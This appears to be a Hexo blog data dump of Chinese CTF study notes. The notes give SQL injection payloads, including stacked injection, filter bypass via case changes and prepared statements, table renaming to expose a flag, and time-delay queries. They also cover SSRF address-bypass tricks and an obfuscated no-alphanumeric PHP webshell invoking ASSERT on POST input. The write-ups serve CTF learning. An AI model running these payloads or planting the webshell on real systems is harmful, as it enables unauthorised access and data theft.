src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214113905.png\" alt=\"image-20201115214113905\"></p>\n<p>此处查询表名为数字、关键字时，使用反引号将其包裹，否则会出现错误<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115215139041.png\" alt=\"image-20201115215139041\"></p>\n</li>\n<li><p>我们可以得知flag存在于supersqli数据库中`1919810931114514`表的flag字段。</p>\n</li>\n<li><p>最终payload有两种</p>\n<ul>\n<li><p>预编译相关语法如下：</p>\n<pre class=\"line-numbers language-text\"><code class=\"language-text\">set用于设置变量名和值\nprepare用于预备一个语句，并赋予名称，以后可以引用该语句\nexecute执行语句\ndeallocate prepare用来释放掉预处理的语句<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">';set @sql = CONCAT('</span>se<span class=\"token string\">','</span>lect <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span>   <span class=\"token punctuation\">`</span><span class=\"token number\">1919810931114514</span><span class=\"token punctuation\">`</span><span class=\"token punctuation\">;</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>prepare stmt <span class=\"token keyword\">from</span> <span class=\"token variable\">@sql</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">EXECUTE</span> stmt<span class=\"token punctuation\">;</span><span class=\"token comment\" spellcheck=\"true\">#</span>\n\n拆分开来如下\n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">';\nset @sql = CONCAT('</span>se<span class=\"token string\">','</span>lect <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">`</span><span class=\"token number\">1919810931114514</span><span class=\"token punctuation\">`</span><span class=\"token punctuation\">;</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nprepare stmt <span class=\"token keyword\">from</span> <span class=\"token variable\">@sql</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXECUTE</span> stmt<span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>结果为：<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220307215.png\" alt=\"image-20201115220307215\"></p>\n<p>这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#\n\n拆分开来如下：\n-1';\nSet @sql = CONCAT('se','lect * from `1919810931114514`;');\nPrepare stmt from @sql;\nEXECUTE stmt;\n#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>结果为：<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220501035.png\" alt=\"image-20201115220501035\"></p>\n</li>\n<li><p><strong>更改表名列名</strong></p>\n<p>修改表名和列名的语法如下：</p>\n<pre class=\"line-numbers language-text\"><code class=\"language-text\">修改表名(将表名user改为users)\nalter table user rename to users;\n\n修改列名(将字段名username改为name)\nalter table users change uesrname name varchar(30);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>最终payload如下：</p>\n<pre class=\"line-numbers language-mysql\"><code class=\"language-mysql\">1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#\n\n拆分开来如下\n1';\nalter table words rename to words1;\nalter table `1919810931114514` rename to words;\nalter table words change flag id varchar(50);\n#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后使用<code>1' or 1=1#</code>即可查询出flag</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"布尔注入\"><a href=\"#布尔注入\" class=\"headerlink\" title=\"布尔注入\"></a>布尔注入</h2><h2 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h2><h3 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"sleep\"></a>sleep</h3><h3 id=\"benchmark\"><a href=\"#benchmark\" class=\"headerlink\" title=\"benchmark\"></a>benchmark</h3><h3 id=\"heavy-query\"><a href=\"#heavy-query\" class=\"headerlink\" title=\"heavy query\"></a>heavy query</h3><p>heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。</p>\n<ul>\n<li><p>笛卡尔积</p>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> A<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> B<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> C<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>get_lock</p>\n<p>延时精确可控，利用环境有限，需要开两个session测试。</p>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> get_lock<span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> get_lock<span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>rlike</p>\n<p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>\n<pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> rpad<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token number\">4999999</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">RLIKE</span> concat<span class=\"token punctuation\">(</span>repeat<span class=\"token punctuation\">(</span><span class=\"token string\">'(a.*)+'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n</ul>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><h2 id=\"联合注入\"><a href=\"#联合注入\" class=\"headerlink\" title=\"联合注入\"></a>联合注入</h2><h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><h3 id=\"group-by重复键冲突\"><a href=\"#group-by重复键冲突\" class=\"headerlink\" title=\"group by重复键冲突\"></a>group by重复键冲突</h3><ul>\n<li><p>多种形式payload：</p>\n<pre><code class=\"sql\">select count(*),(concat(floor(rand(0)*2),&#39;%&#39;,(select version()),&#39;%&#39;))x from information_schema.tables group by x;</code></pre>\n<pre><code class=\"sql\">select concat(left(rand(),3),&#39;%&#39;,(select version()),&#39;%&#39;)x,count(*) from information_schema.tables group by x;</code></pre>\n<p>注：输出字符长度限制为64个字符</p>\n</li>\n</ul>\n<h3 id=\"XPATH报错\"><a href=\"#XPATH报错\" class=\"headerlink\" title=\"XPATH报错\"></a>XPATH报错</h3><p>在MySQL高于5.1版本中添加了对XML文档进行查询和修改的函数:</p>\n<ul>\n<li><p>extractvalue()</p>\n<pre><code class=\"sql\">EXTRACTVALUE (XML_document, XPath_string);</code></pre>\n<ul>\n<li>对XML文档进行查询的函数</li>\n<li>语法：extractvalue(目标xml文档，xml路径)</li>\n</ul>\n<pre><code class=\"sql\">?id=1 and extractvalue(1,concat(&#39;%&#39;,(select version()),&#39;%&#39;)) --+</code></pre>\n</li>\n<li><p>updatexml()</p>\n<ul>\n<li>updatexml()函数与extractvalue()类似，是更新xml文档的函数</li>\n<li>语法：updatexml(目标xml文档，xml路径，更新的内容)</li>\n</ul>\n<pre><code class=\"sql\">?id=1 and updatexml(1,concat(&#39;%&#39;,(select version()),&#39;%&#39;),1) --+</code></pre>\n</li>\n</ul>\n<p>当这两个函数在执行时,如果出现xml文档路径错误就会产生</p>\n<p>注：输出字符有长度限制，最长32位</p>\n<h3 id=\"ExtractValue报错\"><a href=\"#ExtractValue报错\" class=\"headerlink\" title=\"ExtractValue报错\"></a>ExtractValue报错</h3><pre><code class=\"sql\">and extractvalue(1, payload)\nand extractvalue(1, concat(0x7e,@@version,0x7e))</code></pre>\n<p>注：输出字符有长度限制，最长32位</p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p>什么是堆叠注入：使用分号结束上一个语句再叠加其他语句一起执行</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/78989602\" target=\"_blank\" rel=\"noopener\">参考</a></p>\n<p>例题来自BUUCTF-[强网杯 2019]随便注1</p>\n<ul>\n<li><p>打开后查看源码<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212459552.png\" alt=\"image-20201115212459552\"><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212514056.png\" alt=\"image-20201115212514056\"></p>\n</li>\n<li><p>所以就手工注入吧。尝试单引号，发现报错</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212619437.png\" alt=\"image-20201115212619437\"></p>\n<p>显然是但引号闭合，尝试闭合，发现没问题<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212729519.png\" alt=\"image-20201115212729519\"></p>\n</li>\n<li><p>有报错，有回显，那就从<strong>联合注入</strong>开始。发现到order by 3时报错，即有两个字段<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212924226.png\" alt=\"image-20201115212924226\"></p>\n</li>\n<li><p>select查询发现被过滤<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213016731.png\" alt=\"image-20201115213016731\"></p>\n</li>\n<li><p><strong>多行注释</strong>、<strong>大小写</strong>、<strong>双写</strong>均无法绕过，并且由于update被过滤，无法用<strong>updatexml报错</strong>，尝试<strong>ExtractValue报错</strong><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213531495.png\" alt=\"image-20201115213531495\"></p>\n</li>\n<li><p><strong>ExtractValue报错</strong>可行，不过也到此为止。这时考虑<strong>堆叠注入</strong>，发现可行<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213647092.png\" alt=\"image-20201115213647092\"></p>\n</li>\n<li><p>查出当前可查的表<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214021920.png\" alt=\"image-20201115214021920\"></p>\n</li>\n<li><p>用desc查看表结构的详细信息<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214113905.png\" alt=\"image-20201115214113905\"></p>\n<p>此处查询表名为数字、关键字时，使用反引号将其包裹，否则会出现错误<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115215139041.png\" alt=\"image-20201115215139041\"></p>\n</li>\n<li><p>我们可以得知flag存在于supersqli数据库中`1919810931114514`表的flag字段。</p>\n</li>\n<li><p>最终payload有两种</p>\n<ul>\n<li><p>预编译相关语法如下：</p>\n<pre><code class=\"text\">set用于设置变量名和值\nprepare用于预备一个语句，并赋予名称，以后可以引用该语句\nexecute执行语句\ndeallocate prepare用来释放掉预处理的语句</code></pre>\n<pre><code class=\"sql\">-1&#39;;set @sql = CONCAT(&#39;se&#39;,&#39;lect * from   `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;#\n\n拆分开来如下\n-1&#39;;\nset @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);\nprepare stmt from @sql;\nEXECUTE stmt;\n#</code></pre>\n<p>结果为：<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220307215.png\" alt=\"image-20201115220307215\"></p>\n<p>这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。</p>\n<pre><code class=\"mysql\">-1&#39;;Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);Prepare stmt from @sql;EXECUTE stmt;#\n\n拆分开来如下：\n-1&#39;;\nSet @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);\nPrepare stmt from @sql;\nEXECUTE stmt;\n#</code></pre>\n<p>结果为：<img src=\"https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220501035.png\" alt=\"image-20201115220501035\"></p>\n</li>\n<li><p><strong>更改表名列名</strong></p>\n<p>修改表名和列名的语法如下：</p>\n<pre><code class=\"text\">修改表名(将表名user改为users)\nalter table user rename to users;\n\n修改列名(将字段名username改为name)\nalter table users change uesrname name varchar(30);</code></pre>\n<p>最终payload如下：</p>\n<pre><code class=\"mysql\">1&#39;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#\n\n拆分开来如下\n1&#39;;\nalter table words rename to words1;\nalter table `1919810931114514` rename to words;\nalter table words change flag id varchar(50);\n#</code></pre>\n<p>然后使用<code>1&#39; or 1=1#</code>即可查询出flag</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"布尔注入\"><a href=\"#布尔注入\" class=\"headerlink\" title=\"布尔注入\"></a>布尔注入</h2><h2 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h2><h3 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"sleep\"></a>sleep</h3><h3 id=\"benchmark\"><a href=\"#benchmark\" class=\"headerlink\" title=\"benchmark\"></a>benchmark</h3><h3 id=\"heavy-query\"><a href=\"#heavy-query\" class=\"headerlink\" title=\"heavy query\"></a>heavy query</h3><p>heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。</p>\n<ul>\n<li><p>笛卡尔积</p>\n<pre><code class=\"sql\">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</code></pre>\n</li>\n<li><p>get_lock</p>\n<p>延时精确可控，利用环境有限，需要开两个session测试。</p>\n<pre><code class=\"sql\">select get_lock(&#39;test&#39;,1);</code></pre>\n<pre><code class=\"sql\">select get_lock(&#39;test&#39;,5);</code></pre>\n</li>\n<li><p>rlike</p>\n<p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>\n<pre><code class=\"sql\">select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);</code></pre>\n</li>\n</ul>\n"},{"title":"SSRF中FastCGI本地搭建及原理利用","date":"2021-09-10T06:01:11.747Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n> 参考\n>\n> https://bbs.ichunqiu.com/thread-58455-1-1.html\n\n","source":"_posts/SSRF中FastCGI本地搭建及原理利用.md","raw":"---\ntitle: SSRF中FastCGI本地搭建及原理利用\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: [FastCGI,SSRF]\ncategories: [FastCGI,SSRF]\n---\n\n\n\n> 参考\n>\n> https://bbs.ichunqiu.com/thread-58455-1-1.html\n\n","slug":"SSRF中FastCGI本地搭建及原理利用","published":1,"updated":"2021-08-21T09:25:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuye20019t8op45ff9mn7","content":"<blockquote>\n<p>参考</p>\n<p><a href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-58455-1-1.html</a></p>\n</blockquote>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<blockquote>\n<p>参考</p>\n<p><a href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-58455-1-1.html</a></p>\n</blockquote>\n"},{"title":"php伪随机数","date":"2021-09-10T06:01:12.197Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n脚本[php_mt_seed](https://www.openwall.com/php_mt_seed/)\n\n","source":"_posts/php伪随机数.md","raw":"---\ntitle: php伪随机数\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: PHP\ncategories: PHP\n---\n\n脚本[php_mt_seed](https://www.openwall.com/php_mt_seed/)\n\n","slug":"php伪随机数","published":1,"updated":"2021-07-27T03:36:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuye6001dt8op2mln1uan","content":"<p>脚本<a href=\"https://www.openwall.com/php_mt_seed/\" target=\"_blank\" rel=\"noopener\">php_mt_seed</a></p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<p>脚本<a href=\"https://www.openwall.com/php_mt_seed/\" target=\"_blank\" rel=\"noopener\">php_mt_seed</a></p>\n"},{"title":"SSRF_Bypass","date":"2021-09-10T06:01:11.609Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# SSRF_Bypass\n\n## URL\n\n两个函数一个是url_parser根据url解析出它的host,query,path等信息,第二个就是curl的扩展我们知道curl在php里面可以去用来捕获一个页面取回并输出,那么针对url_parser和curl会有一个识别host的误差,我们可以结合这两个识别host的不同.对地址过滤的情况进行一个bypass.\n\n![img](https://gitee.com/h1ler/blogimage/raw/master/img/104969439.png)\n\n参考[知识盒子](https://zhishihezi.net/box/b826e3c021c5dc367665f743ae5fa14b)SSRF题目之地址绕过\n\n## 数字IP\n\n尝试将ip地址转换为进制的方式进行绕过,127.0.0.1转换为16进制是0x7F000001\n\n## DNS重绑定\n\nhttps://zhuanlan.zhihu.com/p/89426041","source":"_posts/SSRF_Bypass.md","raw":"---\ntitle: SSRF_Bypass\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: SSRF\ncategories: SSRF\n---\n\n\n\n# SSRF_Bypass\n\n## URL\n\n两个函数一个是url_parser根据url解析出它的host,query,path等信息,第二个就是curl的扩展我们知道curl在php里面可以去用来捕获一个页面取回并输出,那么针对url_parser和curl会有一个识别host的误差,我们可以结合这两个识别host的不同.对地址过滤的情况进行一个bypass.\n\n![img](https://gitee.com/h1ler/blogimage/raw/master/img/104969439.png)\n\n参考[知识盒子](https://zhishihezi.net/box/b826e3c021c5dc367665f743ae5fa14b)SSRF题目之地址绕过\n\n## 数字IP\n\n尝试将ip地址转换为进制的方式进行绕过,127.0.0.1转换为16进制是0x7F000001\n\n## DNS重绑定\n\nhttps://zhuanlan.zhihu.com/p/89426041","slug":"SSRF_Bypass","published":1,"updated":"2021-07-27T03:33:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuye7001gt8op32lv4s82","content":"<h1 id=\"SSRF-Bypass\"><a href=\"#SSRF-Bypass\" class=\"headerlink\" title=\"SSRF_Bypass\"></a>SSRF_Bypass</h1><h2 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a>URL</h2><p>两个函数一个是url_parser根据url解析出它的host,query,path等信息,第二个就是curl的扩展我们知道curl在php里面可以去用来捕获一个页面取回并输出,那么针对url_parser和curl会有一个识别host的误差,我们可以结合这两个识别host的不同.对地址过滤的情况进行一个bypass.</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/104969439.png\" alt=\"img\"></p>\n<p>参考<a href=\"https://zhishihezi.net/box/b826e3c021c5dc367665f743ae5fa14b\" target=\"_blank\" rel=\"noopener\">知识盒子</a>SSRF题目之地址绕过</p>\n<h2 id=\"数字IP\"><a href=\"#数字IP\" class=\"headerlink\" title=\"数字IP\"></a>数字IP</h2><p>尝试将ip地址转换为进制的方式进行绕过,127.0.0.1转换为16进制是0x7F000001</p>\n<h2 id=\"DNS重绑定\"><a href=\"#DNS重绑定\" class=\"headerlink\" title=\"DNS重绑定\"></a>DNS重绑定</h2><p><a href=\"https://zhuanlan.zhihu.com/p/89426041\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/89426041</a></p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"SSRF-Bypass\"><a href=\"#SSRF-Bypass\" class=\"headerlink\" title=\"SSRF_Bypass\"></a>SSRF_Bypass</h1><h2 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a>URL</h2><p>两个函数一个是url_parser根据url解析出它的host,query,path等信息,第二个就是curl的扩展我们知道curl在php里面可以去用来捕获一个页面取回并输出,那么针对url_parser和curl会有一个识别host的误差,我们可以结合这两个识别host的不同.对地址过滤的情况进行一个bypass.</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/104969439.png\" alt=\"img\"></p>\n<p>参考<a href=\"https://zhishihezi.net/box/b826e3c021c5dc367665f743ae5fa14b\" target=\"_blank\" rel=\"noopener\">知识盒子</a>SSRF题目之地址绕过</p>\n<h2 id=\"数字IP\"><a href=\"#数字IP\" class=\"headerlink\" title=\"数字IP\"></a>数字IP</h2><p>尝试将ip地址转换为进制的方式进行绕过,127.0.0.1转换为16进制是0x7F000001</p>\n<h2 id=\"DNS重绑定\"><a href=\"#DNS重绑定\" class=\"headerlink\" title=\"DNS重绑定\"></a>DNS重绑定</h2><p><a href=\"https://zhuanlan.zhihu.com/p/89426041\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/89426041</a></p>\n"},{"title":"php黑魔法","date":"2021-09-10T06:01:12.364Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n## 当数组遇上string\n\n由php手册我们知道\n\nArray转换整型int/浮点型float会返回元素个数；\n\n转换bool返回Array中是否有元素；转换成string返回'Array'，并抛出warning。\n\n那么实际应用是怎样的呢？\n\n```php\n#test.php\n<?php\n\tif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {\n  \t\teval($_GET['shell']);\n\t}\n?>\n```\n\n要解决这个问题，就得构造无字母和数字的webshell\n\n这里需要借助PHP中的另一个小技巧\n\n![image-20210524032255299](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032255299.png)\n\n即`'a'++='b'`,`'b'++='c'`...因此，我们只需要拿到一个字符`a`，通过自增操作即可获取a-Z中所有字符\n\n那么如何拿到字符`a`呢？\n\n巧了，数组(Array)的第一个字母就是大写A，而第4个字母就是小写a，即我们能同时拿到小写a和大写A\n\n而在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串`Array`![image-20210524032857554](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032857554.png)\n\n那么可构造如下webshell\n\n```php\n<?php\n//最终构造Payload：ASSERT($_POST[_])\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\t\t\t\n```\n\n> 参考\n>\n> https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n","source":"_posts/php黑魔法.md","raw":"---\ntitle: php黑魔法\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: PHP\ncategories: PHP\n---\n\n## 当数组遇上string\n\n由php手册我们知道\n\nArray转换整型int/浮点型float会返回元素个数；\n\n转换bool返回Array中是否有元素；转换成string返回'Array'，并抛出warning。\n\n那么实际应用是怎样的呢？\n\n```php\n#test.php\n<?php\n\tif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {\n  \t\teval($_GET['shell']);\n\t}\n?>\n```\n\n要解决这个问题，就得构造无字母和数字的webshell\n\n这里需要借助PHP中的另一个小技巧\n\n![image-20210524032255299](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032255299.png)\n\n即`'a'++='b'`,`'b'++='c'`...因此，我们只需要拿到一个字符`a`，通过自增操作即可获取a-Z中所有字符\n\n那么如何拿到字符`a`呢？\n\n巧了，数组(Array)的第一个字母就是大写A，而第4个字母就是小写a，即我们能同时拿到小写a和大写A\n\n而在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串`Array`![image-20210524032857554](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032857554.png)\n\n那么可构造如下webshell\n\n```php\n<?php\n//最终构造Payload：ASSERT($_POST[_])\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // 